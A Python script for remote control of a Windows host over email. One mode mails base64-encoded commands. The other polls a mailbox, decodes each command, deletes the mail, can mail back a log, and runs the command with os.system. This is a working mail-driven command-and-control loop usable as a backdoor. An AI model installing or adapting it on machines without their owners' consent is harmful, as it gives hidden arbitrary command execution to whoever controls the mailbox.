# encoding:gbk
import json
import maillib
import os
import time
import sysdeter

# load the config
def setConfig():
    configTxt = open('config.json', "r")
    return json.load(configTxt)

# end program code
def endProgram():
   input()
   os._exit(0)


# judge the system
print('Already determine your system')
print(sysdeter.getComputerInformation())

if sysdeter.systemJudge() == 'w':
    print('this program can run on your computer!')
    print('===============================')
else:
    print('[System error]this program cannot run on your computer')
    endProgram()

# 设置 config
try:
   config = setConfig()
except BaseException:
   print('不能载入配置文件！')
   endProgram()

# 测试邮箱主机
if maillib.testMail(config):
   print("主机与邮箱服务器连接正常！")
else:
   print("不能与邮箱服务器构建链接！！")
   endProgram()

# ask for input
mode = input("控制模式：1 还是被控制模式：2\n> ")

if mode == "1":
    while True:
        # 把输入加密且转码
        inp = maillib.encode64(bytes(input("control> "), encoding='utf-8'))

        try:
            # 发送邮件，并 subject 为"remote control system mail"
            maillib.sendMail(config, "remote control system mail", inp)
            print(": 发送成功！")
        except BaseException:
            print(": 未能成功执行发送！")
            input("回车重试...")

elif mode == "2":
    # 初始化
    testStr = "Subject: remote control system mail"
    refreshFreq = config['RefreshWait']

    print("执行进入主机远程控制系统")
    print('已成功进入')

    # whether set nope
    if config['setNope'] == 1:
        time.sleep(2)
        runDir = sysdeter.runPlace()
        os.system('start nope.bat')
        os._exit(0)

    while True:
        try:
            # 刷新率
            time.sleep(refreshFreq)
            # 获取第一封邮件
            mail = maillib.getMail(config, 0)
            # 如果满足指定 subject，即有命令文件
            if mail[6].decode() == testStr:
                # 输出邮件信息，没什么用，只是看起来很吊
                print('\n')
                print(mail[0].decode())
                print(mail[3].decode())
                print(mail[6].decode())
                # 分析邮件，获取命令
                code = maillib.decode64(maillib.decode64(mail[-1])).decode()
                # 删除命令邮件
                maillib.getMail(config, 1)
                # 发送成功日志到邮箱
                if config['sendLogToMail'] == 1:
                    info = '执行任务成功完成，指令：' + code
                    maillib.sendMail(config, 'mission Successful', info)
                # 执行命令
                print("正在执行的命令：" + code)
                os.system(code)
                print('\n')
        except BaseException:
            print('与服务器失去连接，正在尝试重新尝试')
            time.sleep(5)